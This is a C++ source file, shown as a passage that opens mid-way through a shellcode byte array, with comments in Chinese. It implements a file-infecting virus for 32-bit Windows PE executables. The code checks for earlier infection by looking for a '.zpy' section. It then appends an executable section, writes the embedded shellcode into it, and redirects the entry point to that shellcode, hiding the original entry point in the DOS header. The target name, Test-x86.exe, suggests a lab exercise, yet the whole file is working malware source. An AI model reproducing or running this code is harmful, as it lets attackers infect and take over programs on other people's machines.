0xff, 0x70, 0x33, 0xc0, 0x40, 0x6b, 0xc0, 0x3, 0xc6, 0x84, 0x5, 0x24, 0xfe, 0xff, 0xff, 0x79, 0x33, 0xc0, 0x40, 0xc1, 0xe0, 0x2, 0xc6, 0x84, 0x5, 0x24, 0xfe, 0xff, 0xff, 00, 0xc7, 0x45, 0xc0, 00, 0x10, 00, 00, 0x8b, 0x85, 0xf4, 0xfc, 0xff, 0xff, 0x89, 0x45, 0xd4, 0x8b, 0x85, 0xf8, 0xfc, 0xff, 0xff, 0x89, 0x85, 0xa4, 0xfe, 0xff, 0xff, 0x8b, 0x45, 0xc0, 0x99, 0xf7, 0xbd, 0xa4, 0xfe, 0xff, 0xff, 0x8b, 0xc8, 0x8b, 0x45, 0xc0, 0x99, 0xf7, 0xbd, 0xa4, 0xfe, 0xff, 0xff, 0xf7, 0xda, 0x1b, 0xd2, 0xf7, 0xda, 0x3, 0xca, 0xf, 0xaf, 0x8d, 0xa4, 0xfe, 0xff, 0xff, 0x89, 0x8d, 0x34, 0xfe, 0xff, 0xff, 0x8b, 0x85, 0x98, 0xfe, 0xff, 0xff, 0x33, 0xd2, 0xf7, 0x75, 0xd4, 0x8b, 0xc8, 0x8b, 0x85, 0x98, 0xfe, 0xff, 0xff, 0x33, 0xd2, 0xf7, 0x75, 0xd4, 0xf7, 0xda, 0x1b, 0xd2, 0xf7, 0xda, 0x3, 0xca, 0xf, 0xaf, 0x4d, 0xd4, 0x3, 0x8d, 0x54, 0xfe, 0xff, 0xff, 0x89, 0x8d, 0x30, 0xfe, 0xff, 0xff, 0x8b, 0x45, 0xc0, 0x89, 0x85, 0x2c, 0xfe, 0xff, 0xff, 0x8b, 0x85, 0x50, 0xfe, 0xff, 0xff, 0x3, 0x85, 0x4c, 0xfe, 0xff, 0xff, 0x89, 0x85, 0x38, 0xfe, 0xff, 0xff, 0xc7, 0x85, 0x48, 0xfe, 0xff, 0xff, 0x20, 00, 00, 0x60, 0x8b, 0x85, 0x30, 0xfe, 0xff, 0xff, 0x89, 0x85, 0x1c, 0xfe, 0xff, 0xff, 0x6b, 0x45, 0xa0, 0x28, 0x8b, 0x8d, 0x18, 0xfe, 0xff, 0xff, 0x8d, 0x84, 0x1, 0xf8, 00, 00, 00, 0x33, 0xc9, 0x89, 0x45, 0xf4, 0x89, 0x4d, 0xf8, 0x6a, 00, 0x8d, 0x45, 0xf4, 0x50, 0xff, 0x75, 0xf8, 0xff, 0x75, 0xf4, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xe8, 0x6a, 00, 0x8d, 0x45, 0xe4, 0x50, 0x6a, 0x28, 0x8d, 0x85, 0x24, 0xfe, 0xff, 0xff, 0x50, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xd0, 0xf, 0xb7, 0x85, 0xc2, 0xfc, 0xff, 0xff, 0x40, 0x66, 0x89, 0x85, 0xc2, 0xfc, 0xff, 0xff, 0x8b, 0x45, 0xc0, 0x99, 0xf7, 0x7d, 0xd4, 0x8b, 0xc8, 0x8b, 0x45, 0xc0, 0x99, 0xf7, 0x7d, 0xd4, 0xf7, 0xda, 0x1b, 0xd2, 0xf7, 0xda, 0x3, 0xca, 0xf, 0xaf, 0x4d, 0xd4, 0x3, 0x8d, 0xc, 0xfd, 0xff, 0xff, 0x89, 0x8d, 0xc, 0xfd, 0xff, 0xff, 0x8b, 0x85, 0x18, 0xfe, 0xff, 0xff, 0x99, 0x89, 0x45, 0xf4, 0x89, 0x55, 0xf8, 0x6a, 00, 0x8d, 0x45, 0xf4, 0x50, 0xff, 0x75, 0xf8, 0xff, 0x75, 0xf4, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xe8, 0x6a, 00, 0x8d, 0x45, 0xe4, 0x50, 0x68, 0xf8, 00, 00, 00, 0x8d, 0x85, 0xbc, 0xfc, 0xff, 0xff, 0x50, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xd0, 0x8b, 0x85, 0x38, 0xfe, 0xff, 0xff, 0x33, 0xc9, 0x89, 0x45, 0xf4, 0x89, 0x4d, 0xf8, 0x6a, 00, 0x8d, 0x45, 0xf4, 0x50, 0xff, 0x75, 0xf8, 0xff, 0x75, 0xf4, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xe8, 0x6a, 0x4, 0x68, 00, 0x30, 00, 00, 0xff, 0xb5, 0x34, 0xfe, 0xff, 0xff, 0x6a, 00, 0xff, 0x95, 0x8c, 0xfe, 0xff, 0xff, 0x89, 0x85, 0x9c, 0xfe, 0xff, 0xff, 0x6a, 00, 0x8d, 0x45, 0xe4, 0x50, 0xff, 0xb5, 0x34, 0xfe, 0xff, 0xff, 0xff, 0xb5, 0x9c, 0xfe, 0xff, 0xff, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xd0, 0x68, 00, 0x80, 00, 00, 0x6a, 00, 0xff, 0xb5, 0x9c, 0xfe, 0xff, 0xff, 0xff, 0x95, 0x88, 0xfe, 0xff, 0xff, 0x8b, 0x85, 0xe4, 0xfc, 0xff, 0xff, 0xc1, 0xe8, 0x10, 0x66, 0x89, 0x85, 0xbc, 0xfe, 0xff, 0xff, 0x8b, 0x85, 0xe4, 0xfc, 0xff, 0xff, 0x25, 0xff, 0xff, 00, 00, 0x66, 0x89, 0x85, 0xb4, 0xfe, 0xff, 0xff, 0x6a, 0x2, 0x58, 0x6b, 0xc0, 00, 0x66, 0x8b, 0x8d, 0xb4, 0xfe, 0xff, 0xff, 0x66, 0x89, 0x8c, 0x5, 0xf8, 0xfd, 0xff, 0xff, 0x6a, 0x2, 0x58, 0xc1, 0xe0, 00, 0x66, 0x8b, 0x8d, 0xbc, 0xfe, 0xff, 0xff, 0x66, 0x89, 0x8c, 0x5, 0xf8, 0xfd, 0xff, 0xff, 0xf, 0x57, 0xc0, 0x66, 0xf, 0x13, 0x45, 0xf4, 0x6a, 00, 0x8d, 0x45, 0xf4, 0x50, 0xff, 0x75, 0xf8, 0xff, 0x75, 0xf4, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xe8, 0x6a, 00, 0x8d, 0x45, 0xe4, 0x50, 0x6a, 0x40, 0x8d, 0x85, 0xdc, 0xfd, 0xff, 0xff, 0x50, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xd0, 0x8b, 0x85, 0x30, 0xfe, 0xff, 0xff, 0x89, 0x85, 0xe4, 0xfc, 0xff, 0xff, 0x8b, 0x85, 0x18, 0xfe, 0xff, 0xff, 0x99, 0x89, 0x45, 0xf4, 0x89, 0x55, 0xf8, 0x6a, 00, 0x8d, 0x45, 0xf4, 0x50, 0xff, 0x75, 0xf8, 0xff, 0x75, 0xf4, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xe8, 0x6a, 00, 0x8d, 0x45, 0xe4, 0x50, 0x68, 0xf8, 00, 00, 00, 0x8d, 0x85, 0xbc, 0xfc, 0xff, 0xff, 0x50, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xd0, 0x8b, 0x85, 0x38, 0xfe, 0xff, 0xff, 0x33, 0xc9, 0x89, 0x45, 0xf4, 0x89, 0x4d, 0xf8, 0x6a, 00, 0x8d, 0x45, 0xf4, 0x50, 0xff, 0x75, 0xf8, 0xff, 0x75, 0xf4, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xe8, 0x6a, 00, 0x8d, 0x45, 0xe4, 0x50, 0x68, 00, 0x10, 00, 00, 0xff, 0x75, 0xe0, 0xff, 0x75, 0xfc, 0xff, 0x55, 0xd0, 0xff, 0x75, 0xfc, 0xff, 0x95, 0xa0, 0xfe, 0xff, 0xff, 0xff, 0xb5, 0x84, 0xfe, 0xff, 0xff, 0xff, 0xb5, 0xcc, 0xfe, 0xff, 0xff, 0xff, 0x95, 0x80, 0xfe, 0xff, 0xff, 0x85, 0xc0, 0xf, 0x85, 0x6a, 0xfa, 0xff, 0xff, 0xff, 0xb5, 0xcc, 0xfe, 0xff, 0xff, 0xff, 0x95, 0x7c, 0xfe, 0xff, 0xff, 0x64, 0xa1, 0x30, 00, 00, 00, 0x8b, 0x40, 0xc, 0x8b, 0x40, 0x14, 0x8b, 0x40, 0x10, 0x8b, 0x58, 0x1c, 0x8b, 0x48, 0x1e, 0xc1, 0xe1, 0x10, 0xb, 0xd9, 0x3, 0xc3, 0xff, 0xe0, 0x90, 0x90, 0x5b, 0xc9, 0xc3 };

/*
    获取文件DosHeader、NtHeader、节表项数等信息
*/
DWORD getHeader(const char* file) {
    FILE* pFile;
    pFile = fopen(file, "rb+");
    if (pFile == NULL) {
        std::cout << "Failed to open file " << file << std::endl;
        return 1;
    }
    else std::cout << "Open successfully in getHeader. " << file << std::endl;

    // 读取DOS头
    if (fread(&dosHeader, sizeof(IMAGE_DOS_HEADER), 1, pFile) == 0) {
        std::cout << "Failed to read DosHeader! " << pFile << std::endl;
        fclose(pFile);
        return 1;
    }
    else std::cout << "Read DosHeader successfully in getHeader " << std::endl;

    fseek(pFile, dosHeader.e_lfanew, SEEK_SET);

    // 读取NT头
    if (fread(&ntHeader, sizeof(IMAGE_NT_HEADERS), 1, pFile) == 0) {
        std::cout << "Failed to read NtHeader! " << pFile << std::endl;
        fclose(pFile);
        return 1;
    }
    else std::cout << "Read NtHeader successfully in getHeader. " << std::endl;

    // 获取当前节表项数
    numSections = ntHeader.FileHeader.NumberOfSections;
    printf("Original numSections = %d\n", numSections);

    fclose(pFile);
    return 0;
}

/*
    判断文件是否是PE文件
*/
DWORD isPE(const char* file) {
    FILE* pFile;
    pFile = fopen(file, "rb+");

    // 检查是否以“MZ”开头
    if (dosHeader.e_magic != 0x5A4D) {
        printf("The dosHeader.e_magic != MZ\n");
        fclose(pFile);
        return 1;
    }

    // 判断是否为32bit文件
    if (ntHeader.OptionalHeader.Magic != 0x10b) {
        printf("The optionalHeader.Magic != 0x10b, not a 32bit file.\n");
        fclose(pFile);
        return 1;
    }

    // 判断PE标志
    if (ntHeader.Signature != 0x4550) {
        printf("It's not a PE file.\n");
        fclose(pFile);
        return 1;
    }

    fclose(pFile);
    return 0;
}

/*
    判断是否已经被感染，避免重复感染，
    通过遍历节，寻找是否有和".zpy"同名的节来判断
*/
DWORD isInfected(const char* file) {
    FILE* pFile;
    pFile = fopen(file, "rb+");

    //循环遍历各节名，判断文件是否已经被感染
    for (int i = 0; i < numSections; i++) {
        IMAGE_SECTION_HEADER temSectionHeader;
        fseek(pFile, dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS) + i * sizeof(IMAGE_SECTION_HEADER), SEEK_SET);
        if (fread(&temSectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, pFile) == 0) {
            std::cout << "In f_isInfected, failed to read section header! " << pFile << std::endl;
            fclose(pFile);
            return 1;
        }
        if (_stricmp((char*)temSectionHeader.Name, ".zpy") == 0) {
            printf("The file has been infected!\n");
            return 1;
        }
    }
    fclose(pFile);
    return 0;
}


/*
新增病毒载荷节表项
函数新增病毒节的Section Header，步骤如下：

1、将文件指针移动到最后一个节表项的位置，读取最后一个节表项，并将其存储到lastSenctionHeader变量中。
2、新增一个节表项，并设置其相关属性，如名称、大小、虚拟地址、物理地址等。
3、更新NT头中的节表项数和文件大小等相关信息。
4、将新增的节表项写入到文件中。
5、为新增的节分配内存空间，并将其填充为零。
*/

DWORD_PTR addSection(const char* file) {
    FILE* pFile;
    pFile = fopen(file, "rb+");

    // 读取最后一个节的信息，获取位置
    fseek(pFile, dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (numSections - 1) * sizeof(IMAGE_SECTION_HEADER), SEEK_SET);
    if (fread(&lastSectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, pFile) == 0) {
        std::cout << "Failed to read last section header! " << pFile << std::endl;
        fclose(pFile);
        return 1;
    }
    else std::cout << "Read lastSectionHeader successfully in addSection." << std::endl;

    //获取最后一个节表项信息
    DWORD pointerofrawdata = lastSectionHeader.PointerToRawData;
    DWORD sizeofrawdata = lastSectionHeader.SizeOfRawData;
    DWORD virtualaddress = lastSectionHeader.VirtualAddress;
    DWORD virtualsize = lastSectionHeader.Misc.VirtualSize;


    // 设置新的节表项属性，修改对应节个数等信息
    newSectionHeader.Name[0] = '.';
    newSectionHeader.Name[1] = 'z';
    newSectionHeader.Name[2] = 'p';
    newSectionHeader.Name[3] = 'y';
    newSectionHeader.Name[4] = '\0';

    int codelength = sizeof(shellcode);
    printf("codeLength = %x\n", codelength);
    float sectionAlignment = ntHeader.OptionalHeader.SectionAlignment;
    float fileAlignment = ntHeader.OptionalHeader.FileAlignment;
    newSectionHeader.SizeOfRawData = (DWORD)(ceil(codelength / fileAlignment) * fileAlignment); // 分配节的大小，与文件对齐
    newSectionHeader.VirtualAddress = (DWORD)(virtualaddress + ceil(float(virtualsize) / sectionAlignment) * sectionAlignment);  //向上取整，进行对齐
    newSectionHeader.Misc.VirtualSize = codelength; 
    newSectionHeader.PointerToRawData = pointerofrawdata + sizeofrawdata; // 节数据在文件中的偏移
    newSectionHeader.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ; // 属性为可执行代码和可读

    // 写入新的节表项
    fseek(pFile, dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS) + numSections * sizeof(IMAGE_SECTION_HEADER), SEEK_SET);
    if (fwrite(&newSectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, pFile) != 1) {
        std::cout << "Failed to write section header!" << std::endl;
        fclose(pFile);
        return 1; // 添加写失败处理
    }
    else std::cout << "Write newSectionHeader successfully." << std::endl;

    // 分配内存空间并填充为零
    fseek(pFile, newSectionHeader.PointerToRawData, SEEK_SET);  // 将文件指针移动到新节的位置
    byte* s = (byte*)malloc(newSectionHeader.SizeOfRawData);
    ZeroMemory((void*)s, newSectionHeader.SizeOfRawData);
    if (fwrite(s, newSectionHeader.SizeOfRawData, 1, pFile) != 1) {
        std::cout << "Failed to write section header!" << std::endl;
        fclose(pFile);
        return 1; // 添加写失败处理
    }
    else  std::cout << "Padding zero successfully." << std::endl;
    free(s);

    // 更新NT头
    ntHeader.FileHeader.NumberOfSections += 1;
    //ntHeader.OptionalHeader.SizeOfImage += 0x1000;
    ntHeader.OptionalHeader.SizeOfImage += (ceil(codelength / sectionAlignment) * sectionAlignment);

    fseek(pFile, dosHeader.e_lfanew, SEEK_SET);
    if (fwrite(&ntHeader, sizeof(IMAGE_NT_HEADERS), 1, pFile) != 1) {
        std::cout << "Failed to write section header!" << std::endl;
        fclose(pFile);
        return 1; // 添加写失败处理
    }

    fclose(pFile);
    return 0;
}


/*
改变PE文件的程序入口点，步骤如下：

1、通过fopen函数打开指定的PE文件，并检查是否打开成功
2、将文件指针移动到PE头的位置,获取旧的入口地址
3、将新的入口地址设置到PE头信息的OptionalHeader.AddressOfEntryPoint字段中
4、将旧的入口地址保存在Dos头的e_res数组中，地址高16位在e_res[1]，低16位在e_res[0]
5、将更新后的PE头信息写入文件中
*/
DWORD changeEntry(const char* File) {

    // 打开文件
    FILE* pFile = fopen(File, "rb+");
    if (pFile == NULL) {
        std::cout << "Failed to open file " << pFile << std::endl;
        return 1;
    }
    else std::cout << "Open successfully in changeEntry. " << pFile << std::endl;

    // 获取旧的入口地址
    DWORD oldEntry = ntHeader.OptionalHeader.AddressOfEntryPoint;

    // 将地址转换成两个 word 类型的值
    WORD entry_point_high = (WORD)(ntHeader.OptionalHeader.AddressOfEntryPoint >> 16);
    WORD entry_point_low = (WORD)(ntHeader.OptionalHeader.AddressOfEntryPoint & 0xFFFF);
    // 存入 e_res 数组中
    dosHeader.e_res[0] = entry_point_low;
    dosHeader.e_res[1] = entry_point_high;
    // 打印结果
    printf("e_res[0] = %x\n", dosHeader.e_res[0]);
    printf("e_res[1] = %x\n", dosHeader.e_res[1]);

    // 更新Dos头
    if (fwrite(&dosHeader, sizeof(IMAGE_DOS_HEADER), 1, pFile) != 1) {
        std::cout << "Failed to update DosHeader->e_res!" << std::endl;
        fclose(pFile);
        return 1; // 添加写失败处理
    }

    // 设置新的入口地址
    ntHeader.OptionalHeader.AddressOfEntryPoint = newSectionHeader.VirtualAddress;

    // 写入更新后的PE头信息
    fseek(pFile, dosHeader.e_lfanew, SEEK_SET);
    if (fwrite(&ntHeader, sizeof(IMAGE_NT_HEADERS), 1, pFile) != 1) {
        std::cout << "Failed to update NtHeader->entrypoint!" << std::endl;
        fclose(pFile);
        return 1; // 添加写失败处理
    }

    fclose(pFile);
    return 0;
}


/*
    将shellcode写入新增节中
*/
int paddingShellcode(const char* file) {
    // 打开文件并移动到新增节的文件绝对地址处
    FILE* pFile = fopen(file, "rb+");
    if (pFile == NULL) {
        std::cout << "Failed to open file " << file << std::endl;
        return 1;
    }
    else std::cout << "Open successfully in paddingShellcode." << file << std::endl;

    fseek(pFile, newSectionHeader.PointerToRawData, SEEK_SET);

    // 写入shellcode
    if (fwrite(shellcode, sizeof(BYTE), sizeof(shellcode) / sizeof(BYTE), pFile) != sizeof(shellcode) / sizeof(BYTE)) {
        std::cout << "Failed to write shellcode!" << std::endl;
        fclose(pFile);
        return 1; // 添加写失败处理
    }
    else  std::cout << "Padding shellcode successfully." << std::endl;

    fclose(pFile);
    return 0;
}

int main() {
    char* pFile = (char*)"Test-x86.exe";
    if (getHeader(pFile)) {
        printf("Failed getting Header.\n");
        return 1;
    }
    if (isPE(pFile) || isInfected(pFile))
        return 1;
    else    printf("This is a 32bit PE file.\n");
    addSection(pFile);
    changeEntry(pFile);
    paddingShellcode(pFile);

    return 0;
}

